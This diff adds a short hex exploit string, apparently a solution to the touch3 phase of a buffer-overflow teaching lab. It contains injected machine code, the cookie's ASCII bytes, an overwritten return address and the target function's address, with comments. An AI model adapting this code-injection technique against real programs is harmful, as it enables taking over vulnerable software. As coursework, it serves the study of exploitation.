@@ -1,0 +1,7 @@
+48 c7 c7 80 fd 66 55 48 /* mov rsp + 0x8 (where address is) */ 
+2b 24 25 28 00 00 00 c3
+00 00 00 00 00 00 00 00
+37 36 39 32 37 62 62 66 /* ascii of cookie */
+00 00 00 00 00 00 00 00
+68 fd 66 55 00 00 00 00 /*return rsp address*/
+17 5c 55 55 55 55 00 00 /* touch3 address */
